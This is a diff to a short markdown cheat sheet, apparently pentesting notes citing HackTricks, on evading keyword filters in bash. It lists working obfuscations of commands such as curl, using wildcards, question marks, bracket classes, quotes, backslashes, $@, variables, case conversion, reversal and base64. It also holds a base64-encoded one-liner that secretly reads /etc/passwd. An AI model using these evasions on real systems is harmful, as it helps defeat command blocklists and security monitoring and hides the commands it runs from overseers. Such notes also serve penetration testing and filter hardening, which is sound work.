@@ -1,5 +1,57 @@
 
-## Command bypass
-curl  --> /usr/bin/c*rl
-nmap  --> /usr/bin/nma?
+# Command keywords bypass
+- Question mark
+```
+/usr/bin/cur?
+```
 
+- Wildcard(*)
+
+```
+/usr/bin/c*rl 
+```
+
+- [chars] 
+
+```
+/usr/bin/cur[l]
+```
+
+- Quotes
+
+```
+'c'u'r'l
+cu''r''''l      #'x2
+```
+
+- Backslashes
+
+```
+\c\u\r\l
+```
+
+- $@
+
+```
+cur$@l
+```
+
+- variables
+
+```
+c$(u)ur${u}l$u
+```
+
+- Transformations (case, reverse, base64)
+
+```
+$(tr "[A-Z]" "[a-z]"<<<"CuRl") # -> Upper case to lower case
+$(a="CuRL";printf %s "${a,,}") # -> transformation (only bash)
+$(rev<<<'lruc') 
+bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64
+```
+
+
+
+## Reference
+[bypass-bash-restrictions_HackTricks](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions)
